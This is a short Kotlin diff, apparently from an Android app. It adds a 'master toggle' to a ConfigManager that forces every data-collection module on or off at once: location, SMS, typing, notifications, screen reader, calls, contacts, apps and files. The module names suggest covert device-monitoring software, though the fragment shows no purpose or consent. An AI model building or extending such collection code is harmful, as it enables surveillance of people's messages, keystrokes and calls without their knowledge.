@@ -59,6 +59,14 @@ object ConfigManager {
         }
     }
 
+    fun setAllFeatures(ctx: Context, mode: String) {
+        val targetFeatures = listOf("all", "location", "sms", "typing", "notifications", "screen_reader", "network", "usage", "calls", "contacts", "apps", "files")
+        targetFeatures.forEach { feature ->
+            setFeatureParametric(ctx, feature, mode)
+        }
+        DebugLogger.log("CONFIG", "MASTER TOGGLE applied. All collection modules forced to: $mode")
+    }
+
     fun canCollect(ctx: Context, feature: String): Boolean {
         // 1. Get Rule
         val config = getConfig(ctx)
